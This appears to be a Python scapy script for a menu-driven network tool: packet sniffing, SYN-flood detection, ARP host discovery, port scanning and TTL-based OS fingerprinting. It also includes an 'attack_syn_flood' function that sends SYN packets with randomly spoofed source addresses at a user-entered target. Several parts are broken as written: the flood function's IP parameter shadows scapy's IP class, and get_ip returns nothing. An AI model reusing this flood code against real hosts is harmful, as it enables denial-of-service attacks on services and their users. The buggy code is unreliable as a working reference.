# Author: Anthony Brunetti
import os
from scapy.all import *
from collections import Counter
import time
import logging
import matplotlib
import csv

logging.basicConfig(filename='info_network.log', level=logging.INFO,
	format='%(levelname)s:%(message)s')

# print output 
def print_output(sezion_name,response):
	print( "----------"+ sezion_name +"-----------------")

	print(response)

	print( "-----------------------------------------------")


# tthis function sniffing IP traffic based on the 
# selected network interface is the protocol you want

def sniff_interface(interface,count=20):
	
	print( "-----Sniff packet in the NetworkInterface-------")


	protocol = ["","tcp", "udp", "icmp"]	

	for i in range(0,len( interface)):
	
		print(str(i) + "." +  interface[i])
	
	# the user can filter the traffic according to the network interface he wants
	# input by user 
	choose = (int(input("choose the network interface:	\n")))
	

	print("choose the protocol: \n 0. all protocol \n 1. tcp \n 2. udp \n 3. icmp\n")

	# the user can filter the traffic according to the protocol he wants
	# input by user 
	choose_protocol = (int(input("")))
	

	if  choose_protocol  == 0:
	
		result = sniff(iface = interface[choose],count = count)
	
	else:
	
		result = sniff(iface = interface[choose],filter = protocol[choose_protocol],
	
			count=count)
	

	print(result.show())
	
	logging.info('\n')
	
	logging.info(time.ctime(time.time()))

	logging.info(result)
	
	for row in result:
	
		logging.info(row.sprintf(
			'{IP:%IP.src%}{IPv4:%IPv4.src%}	-> {IP:%IP.dst%}{IPv4:%IPv4.dst%}'))
	
	
	more_information = input("visual more information on packet: (y/n) ")

	if more_information == "y":
	
		for row in result:
			
			
			logging.info(row)
	
	print( "-----------------------------------------------\n")


# function that randomly generates the ip source
def randomIP():

	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))

	return ip

# random port

def randInt():

	x = random.randint(1000,9000)

	return x	

''' this function performs an ack-syn-flood attack.
Sending syn requests to the server without responding to the ack.'''

def attack_syn_flood(IP,number):

	for x in range (0,number):
	
		s_port = randInt()
	
		dstPort = randInt()

		s_eq = randInt()
	
		w_indow = randInt()

		print(randomIP())
		
		srloop(IP(src = randomIP(),dst=IP)/TCP(sport=s_port ,dport=dstPort,seq = s_eq, window = w_indow, flags="S"),count=number)

		ans=""

	return ans
	
'''this function loads a small db in a cvs file relative to the default ttl values 
for each operating system into a data structure'''
def os_fingerprinting_load():
	
	results = []
	
	# open file cvs
	with open("os ttl.csv") as csvfile:
		
		reader = csv.reader(csvfile)
	
		for row in reader: # each row is a list
			
			 # data filtering if it matches the ICMP protocol
			if 'ICMP' in row[2]:
				
				# append in the strucuture
				results.append((row[0] + row[1],int(row[3])))
	
	return results		

'''
In this function it is delegated to look for the os fingerprinting based 
on the ttl value. Discrimination and recognition can be improved by 
using the other fields of the IP and ICMP packet header.
'''
def os_fingerprinting(ttl,db_os_fingerprinting):
	
	for row in db_os_fingerprinting:
		
		if row[1] == ttl:

			return 'The Operative System is: '+row[0]

# send an packet ICMP 
def send_ICMP(ip):

	ans = sr1(IP(dst=ip)/ICMP()/"XXXXXXXXXXX")

	return ans.ttl



# function that return mac adress through ip adress
def get_mac(ip): 
	
	arp_request = ARP(pdst = ip)

	broadcast = Ether(dst ="ff:ff:ff:ff:ff:ff")

	arp_request_broadcast = broadcast / arp_request

	answered_list = srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

	return answered_list[0][1].hwsrc


# network scan for connected host devices
def scan_host_network():

	output =''

	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
		timeout=2)

	for row in ans : 
	
	 	output += str(row) 

	return output ,ans

# scan of open ports via a UDP packet
def scan_udp(host):
	
	ans, unans = sr(IP(dst = host)/UDP(dport = [(1, 65535)]), inter = 0.5, retry = 10, 
		timeout=1)
	
	ans.nsummary()

# scan of open ports via a function report_ports() function integrated scapy
def scan_port_host(ip_host,first_port,ultime_port):

	return report_ports(ip_host,(first_port,ultime_port))
	
'''this function collects all TCP packets containing the SYN fag. 
And it produces a list of all hosts making the most TCP-SYN requests. 
This check is used to check for suspicious activity and indications of TCP-SYN packets.
'''
def dection_syn_flood():

	count = Counter()

	pkts = sniff(filter = 'tcp', count = 50)
	
	for pkt in  pkts:
		
		if TCP in pkt and pkt[TCP].flags == 'S':  # TCP SYN packet
	
			src = pkt.sprintf('{IP:%IP.src%}{IPv4:%IPv4.src%}')
	
			count[src] = count[src] + 1	

	return count
'''
 return the ip address associated with the input mac address
'''

def get_ip(mac_address):

	ans,unans=srp(Ether(dst=mac_address)/ARP(pdst="192.168.1.0/24"),timeout=2)

def main():

	interface = os.listdir('/sys/class/net/')

	db_os_fingerprinting=os_fingerprinting_load()

	menu ='''\nChoose what action to perform:
	1. Sniff interface
	2. Dection syn flood
	3. Attack syn flood
	4. Scan host network  
	5. Os_fingerprinting 
	6. Scan port host\n''' 

	while(True):
		try :
			choose = int(input(menu))
		
			if(choose == 1):
		
				sniff_interface(interface)

			elif (choose == 2):

				output ='\n'

				logging.info('\n')

				logging.info('Dection syn-flood')
				
				logging.info(time.ctime(time.time()))

				count = dection_syn_flood()

				for item in count:

					output += str(item) +"	: "+str(count[item])+'\n'

				logging.info(output)

				print_output("dection syn-flood attack",output)

			elif (choose == 3):

				ip = input("ip target")	

				logging.info('\n')

				logging.info('attack syn flood')
				
				logging.info(time.ctime(time.time()))

				number = int(input('numbers of attacks'))

				logging.info(attack_syn_flood(ip,number))

			elif (choose == 4):	
					
				output,ans = scan_host_network()

				logging.info('\n')

				logging.info('Scan host network')
				
				logging.info(time.ctime(time.time()))

				logging.info(str(output))

				print(ans.show())
		

			elif (choose == 5):
			
				ip = input("ip target")	

				logging.info('\n')

				logging.info('Os fingerprinting ICMP')
				
				logging.info(time.ctime(time.time()))

				count = dection_syn_flood()

				output = os_fingerprinting(send_ICMP(ip),db_os_fingerprinting)
				
				logging.info(output)
				
				print(output)
			
			elif (choose == 6):

				ip = input("ip target")	

				port1 = str(int(input("first port")))

				port2 = str(int(input("second port")))
			
				print(scan_port_host(ip,port1,port2))

			elif (choose == 7):
			
				ip = input("ip target")	

				print(get_mac(ip))
			
		except KeyboardInterrupt:

			print('You pressed Ctrl+C!')

			sys.exit(0)

if __name__ == "__main__":

	main()